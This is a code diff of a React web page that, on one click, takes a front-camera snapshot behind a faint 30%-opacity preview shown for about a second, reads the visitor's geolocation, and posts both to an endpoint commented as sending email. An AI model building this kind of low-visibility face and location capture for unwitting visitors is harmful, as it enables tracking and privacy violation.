@@ -7,22 +7,29 @@ export default function Home() {
   const [showPreview, setShowPreview] = useState(false);
 
   async function capture() {
+    console.log("Capture clicked");
+
+    // 🔴 MUST be first — triggers permission prompt
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" }
     });
+
+    // 🔴 Location permission (also must be direct)
+    const position = await new Promise<GeolocationPosition>((resolve, reject) =>
+      navigator.geolocation.getCurrentPosition(resolve, reject)
+    );
 
     const video = videoRef.current!;
     video.srcObject = stream;
     video.muted = true;
 
-    // show faded preview
+    // now safe to show preview
     setShowPreview(true);
     await video.play();
 
-    // ⏱ keep preview visible for 1 second
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    // allow frame to render
+    await new Promise(r => setTimeout(r, 1000));
 
-    // capture full-quality frame
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -31,25 +38,24 @@ export default function Home() {
     ctx.drawImage(video, 0, 0);
 
     const image = canvas.toDataURL("image/jpeg", 0.9);
+    console.log("Image length:", image.length);
 
-    console.log("Captured image size:", image.length);
-
-    // stop camera + hide preview
+    // cleanup
     stream.getTracks().forEach(t => t.stop());
     setShowPreview(false);
 
-    // capture location + send
-    navigator.geolocation.getCurrentPosition(async pos => {
-      await fetch("/api/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          image,
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude
-        })
-      });
+    // 🔴 SEND EMAIL
+    await fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        image,
+        lat: position.coords.latitude,
+        lon: position.coords.longitude
+      })
     });
+
+    console.log("Send API called");
   }
 
   return (
@@ -65,7 +71,7 @@ export default function Home() {
           style={{
             width: 160,
             height: 160,
-            opacity: 0.3,        // 👈 30% opacity
+            opacity: 0.3,
             borderRadius: 12,
             marginBottom: 16
           }}
